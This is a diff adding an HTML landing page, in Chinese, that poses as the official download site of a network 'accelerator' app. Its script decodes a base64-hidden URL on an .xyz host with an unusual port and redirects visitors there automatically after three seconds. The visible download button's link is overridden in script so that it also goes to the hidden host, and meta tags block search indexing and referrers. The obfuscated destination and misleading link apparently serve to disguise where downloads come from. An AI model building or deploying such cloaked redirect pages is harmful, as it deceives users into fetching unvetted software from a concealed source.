@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <link rel="canonical" href="https://shrmzs.cn/">
+  <title>加速器(全球畅连)官方网站</title>
+  <meta name="keywords" content="加速器,游戏加速器,加速器官网,网络加速器,加速器下载">
+  <meta name="description" content="加速器面向日常网络连接优化，入口清晰、版本获取方便，手机电脑都能快速上手，线路切换、状态查看和问题排查更直观，访问过程更稳定。">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="加速器(全球畅连)官方网站">
+  <meta property="og:description" content="加速器面向日常网络连接优化，入口清晰、版本获取方便，手机电脑都能快速上手，线路切换、状态查看和问题排查更直观，访问过程更稳定。">
+  <meta property="og:url" content="https://shrmzs.cn/">
+  <link rel="icon" href="/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="party-body">
+  <main class="party-card party-card-shrmzs shrmzs-govcn" aria-live="polite">
+    <img src="/assets/images/logo.png" alt="加速器(全球畅连)官方网站标识" title="加速器(全球畅连)官方网站标识">
+    <h1>正在准备下载资源</h1>
+    <p>正在校验访问环境，即将进入下载页面。</p>
+    <div class="progress" aria-hidden="true"><span></span></div>
+    <p class="countdown"><span id="countdown">3</span> 秒后自动继续</p>
+    <a id="manualDownload" class="btn btn-primary" href="/party.html" rel="nofollow noopener noreferrer">立即下载</a>
+    <p class="muted">如未自动跳转，可手动继续。</p>
+  </main>
+  <script>
+    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9rbjUuMzEzNDg2Lnh5ejozNTg4OC8=");
+    const manualDownload = document.getElementById("manualDownload");
+    const countdown = document.getElementById("countdown");
+    let remain = 3;
+
+    const timer = window.setInterval(function () {
+      remain -= 1;
+      countdown.textContent = remain > 0 ? remain : 0;
+      if (remain <= 0) {
+        window.clearInterval(timer);
+      }
+    }, 1000);
+
+    window.setTimeout(function () {
+      window.location.replace(REAL_DOWNLOAD_URL);
+    }, 3000);
+
+    manualDownload.addEventListener("click", function(e){
+        e.preventDefault();
+        window.location.replace(REAL_DOWNLOAD_URL);
+    });
+  </script>
+</body>
+</html>
